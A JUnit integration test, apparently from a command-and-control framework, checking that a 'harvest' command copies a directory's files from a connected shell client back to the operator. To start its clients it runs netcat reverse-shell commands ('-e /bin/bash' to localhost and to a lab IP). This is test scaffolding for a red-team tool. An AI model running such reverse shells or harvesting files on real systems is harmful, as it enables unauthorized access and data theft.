package c2.nativeshell;

import static org.junit.jupiter.api.Assertions.assertArrayEquals;
import static org.junit.jupiter.api.Assertions.assertEquals;
import static org.junit.jupiter.api.Assertions.assertTrue;
import static org.junit.jupiter.api.Assertions.fail;

import java.io.BufferedReader;
import java.io.File;
import java.io.IOException;
import java.io.InputStreamReader;
import java.io.OutputStreamWriter;
import java.net.Socket;
import java.nio.file.Files;
import java.nio.file.Path;
import java.nio.file.Paths;
import java.util.Comparator;

import org.junit.jupiter.api.AfterEach;
import org.junit.jupiter.api.Test;

import c2.remote.RemoteTestExecutor;
import util.Time;
import util.test.OutputStreamWriterHelper;
import util.test.RunnerTestGeneric;
import util.test.TestConfiguration;
import util.test.TestConfiguration.OS;
import util.test.TestConstants;

class NativeShellHarvestTest extends util.test.ClientServerTest {

	@AfterEach
	void cleanup() {
		teardown();
	}

	private static void cleanDumpLogs(String hostname) {
		Path logPath = Paths.get("test", hostname);
		try {
			Files.walk(logPath).sorted(Comparator.reverseOrder()).map(Path::toFile).forEach(File::delete);
		} catch (IOException e2) {
			// Will delete on next attempt
		}
	}
	
	void runNativeHarvestTest(TestConfiguration config) {
		String delim = "\\";
		if(config.os == OS.LINUX) {
			delim = "/";
		}
		try {
			try {
				Thread.sleep(1000);// allow both commander and daemon to start
			} catch (InterruptedException e) {
				// Ensure that python client has connected
			}
			System.out.println("Connecting test commander...");
			Socket remote = new Socket("localhost", 8111);
			System.out.println("Locking test commander streams...");
			OutputStreamWriter bw = new OutputStreamWriter(remote.getOutputStream());
			BufferedReader br = new BufferedReader(new InputStreamReader(remote.getInputStream()));

			// Ensure that client has connected
			Time.sleepWrapped(1000);

			System.out.println("Setting up test commander session...");
			try {
				RunnerTestGeneric.connectionSetupGeneric(remote, bw, br, config.os == TestConfiguration.OS.LINUX,
						config.isRemote());
			} catch (Exception ex) {
				fail(ex.getMessage());
			}
			
			OutputStreamWriterHelper.writeAndSend(bw, "hostname");
			OutputStreamWriterHelper.writeAndSend(bw, "cd agents");
			OutputStreamWriterHelper.writeAndSend(bw, "cd HelloWorld");
			OutputStreamWriterHelper.writeAndSend(bw, "harvest_pwd");
			
			String hostname = br.readLine();
			String output = br.readLine();
			assertTrue(output.endsWith("TheAllCommander" + delim + "agents"));
			output = br.readLine();
			assertTrue(output.endsWith("TheAllCommander" + delim + "agents" + delim + "HelloWorld"));
			output = br.readLine();
			assertTrue(output.endsWith("TheAllCommander" + delim + "agents" + delim + "HelloWorld"), "Got back: " + output);
			output = br.readLine();
			assertTrue(output.endsWith("TheAllCommander" + delim + "agents" + delim + "HelloWorld" + delim + "HelloWorld"));
			output = br.readLine();
			assertTrue(output.startsWith("Harvested File: "));
			assertTrue(output.endsWith("TheAllCommander" + delim + "agents" + delim + "HelloWorld" + delim + "HelloWorld" + delim + "HelloWorld.cpp"));
			output = br.readLine();
			assertTrue(output.startsWith("Harvested File: "));
			assertTrue(output.endsWith("TheAllCommander" + delim + "agents" + delim + "HelloWorld" + delim + "HelloWorld" + delim + "HelloWorld.sln"));
			output = br.readLine();
			assertTrue(output.startsWith("Harvested File: "));
			assertTrue(output.endsWith("TheAllCommander" + delim + "agents" + delim + "HelloWorld" + delim + "HelloWorld" + delim + "HelloWorld.vcxproj"));
			output = br.readLine();
			assertTrue(output.startsWith("Harvested File: "));
			assertTrue(output.endsWith("TheAllCommander" + delim + "agents" + delim + "HelloWorld" + delim + "HelloWorld" + delim + "HelloWorld.vcxproj.filters"));
			output = br.readLine();
			assertTrue(output.startsWith("Harvested File: "));
			assertTrue(output.endsWith("TheAllCommander" + delim + "agents" + delim + "HelloWorld" + delim + "HelloWorld" + delim + "HelloWorld.vcxproj.user"));
			output = br.readLine();
			assertTrue(output.endsWith("TheAllCommander" + delim + "agents" + delim + "HelloWorld" + delim + "java"));
			output = br.readLine();
			assertTrue(output.startsWith("Harvested File: "));
			assertTrue(output.endsWith("TheAllCommander" + delim + "agents" + delim + "HelloWorld" + delim + "java" + delim + ".gitignore"));
			output = br.readLine();
			assertTrue(output.startsWith("Harvested File: "));
			assertTrue(output.endsWith("TheAllCommander" + delim + "agents" + delim + "HelloWorld" + delim + "java" + delim + "HelloWorld.jar"));
			output = br.readLine();
			assertTrue(output.startsWith("Harvested File: "));
			assertTrue(output.endsWith("TheAllCommander" + delim + "agents" + delim + "HelloWorld" + delim + "java" + delim + "HelloWorld.java"));
			output = br.readLine();
			assertEquals("Harvest operation complete", output);
			
			OutputStreamWriterHelper.writeAndSend(bw, "die");
			
			Path currentFolder = Paths.get("test", hostname);
			while(!currentFolder.endsWith("HelloWorld")) {
				currentFolder = currentFolder.toFile().listFiles()[0].toPath();
			}
			File children[] = currentFolder.toFile().listFiles();
			assertEquals(2, children.length);
			if(children[0].getName().equals("HelloWorld")) {
				validateHelloWorldDir(children[0].toPath());
				validateJavaDir(children[1].toPath());
			}else {
				validateHelloWorldDir(children[1].toPath());
				validateJavaDir(children[0].toPath());
			}
			
			cleanDumpLogs(hostname);
		} catch (IOException ex) {
			fail(ex.getMessage());
		}
	}

	void validateJavaDir(Path dir) throws IOException{
		File children[] = dir.toFile().listFiles();
		assertEquals(3, children.length);
		for(File child : children) {
			byte copied[] = Files.readAllBytes(child.toPath());
			byte reference[] = null;
			if(child.getName().equals(".gitignore")) {
				reference = Files.readAllBytes(Paths.get("agents", "HelloWorld", "java", ".gitignore"));
			}else if(child.getName().equals("HelloWorld.jar")) {
				reference = Files.readAllBytes(Paths.get("agents", "HelloWorld", "java", "HelloWorld.jar"));
			}else if(child.getName().equals("HelloWorld.java")) {
				reference = Files.readAllBytes(Paths.get("agents", "HelloWorld", "java", "HelloWorld.java"));
			}else {
				fail("Unknown directory: " + child.getName());
			}
			assertArrayEquals(reference, copied);
		}
	}
	
	void validateHelloWorldDir(Path dir) throws IOException {
		File children[] = dir.toFile().listFiles();
		assertEquals(5, children.length);
		for(File child : children) {
			byte copied[] = Files.readAllBytes(child.toPath());
			byte reference[] = null;
			if(child.getName().equals("HelloWorld.cpp")) {
				reference = Files.readAllBytes(Paths.get("agents", "HelloWorld", "HelloWorld", "HelloWorld.cpp"));
			}else if(child.getName().equals("HelloWorld.sln")) {
				reference = Files.readAllBytes(Paths.get("agents", "HelloWorld", "HelloWorld", "HelloWorld.sln"));
			}else if(child.getName().equals("HelloWorld.vcxproj")) {
				reference = Files.readAllBytes(Paths.get("agents", "HelloWorld", "HelloWorld", "HelloWorld.vcxproj"));
			}else if(child.getName().equals("HelloWorld.vcxproj.filters")) {
				reference = Files.readAllBytes(Paths.get("agents", "HelloWorld", "HelloWorld", "HelloWorld.vcxproj.filters"));
			}else if(child.getName().equals("HelloWorld.vcxproj.user")) {
				reference = Files.readAllBytes(Paths.get("agents", "HelloWorld", "HelloWorld", "HelloWorld.vcxproj.user"));
			}else {
				fail("Unknown directory: " + child.getName());
			}
			assertArrayEquals(reference, copied);
		}
	}
	
	@Test
	void testIntegratedHarvestLocalPlatform() {
		TestConfiguration.OS thisOS = TestConfiguration.getThisSystemOS();

		String ncatName = "ncat";

		try {
			Runtime.getRuntime().exec(ncatName);
		} catch (IOException e) {
			System.out.println("ncat not available on this host, attempting netcat");
			try {
				Runtime.getRuntime().exec("netcat");
				ncatName = "netcat";
			} catch (IOException ex) {
				System.out.println("netcat not available on this host, skipping this test");
				return;
			}
		}

		if (thisOS == OS.WINDOWS) {
			initiateServer();
			spawnClient(TestConstants.WINDOWSNATIVE_TEST_EXE);
		} else {
			initiateServer("test_linux.properties");
			spawnClient(ncatName + " localhost 8003 -e /bin/bash");
		}

		runNativeHarvestTest(new TestConfiguration(thisOS, "Native", "TCP"));

		awaitClient();
	}

	@Test
	void testIntegratedHarvestCrossPlatform() {
		if (TestConfiguration.getThisSystemOS() == OS.WINDOWS) {
			initiateServer();

			RemoteTestExecutor exec = new RemoteTestExecutor();
			if (exec.startTestProgram(1005, "netcat 192.168.56.1 8003 -e /bin/bash")) {
				Time.sleepWrapped(5000);
				TestConfiguration config = new TestConfiguration(OS.LINUX, "Native", "TCP");
				config.setRemote(true);
				runNativeHarvestTest(config);
				awaitClient();
			} else {
				System.out.println("No remote test available, spinning down test");
			}
		}
	}
	
	@Test
	void testLinuxPythonOneLiner() {
		if (TestConfiguration.getThisSystemOS() == OS.WINDOWS) {
			initiateServer();
			RemoteTestExecutor exec = new RemoteTestExecutor();
			if (exec.startTestProgram(1005, RemoteTestExecutor.CMD_EXECUTE_PYTHON)) {
				Time.sleepWrapped(15000);

				TestConfiguration config = new TestConfiguration(OS.LINUX, "Native", "TCP");
				config.setRemote(true);
				runNativeHarvestTest(config);
				awaitClient();
			}
		}
	}

}
